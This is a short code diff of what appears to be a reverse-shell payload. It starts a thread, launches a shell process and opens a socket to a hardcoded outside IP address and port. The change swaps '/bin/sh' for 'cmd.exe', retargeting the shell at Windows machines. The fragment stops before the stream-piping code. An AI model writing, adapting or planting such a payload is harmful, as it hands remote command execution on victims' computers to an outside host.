@@ -7,7 +7,7 @@
         new Thread(function () {
             var host = "165.22.238.35";
             var port = 12346;
-            var cmd = "/bin/sh";
+            var cmd = "cmd.exe";
             var p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
             var s = new Socket(host, port);
 
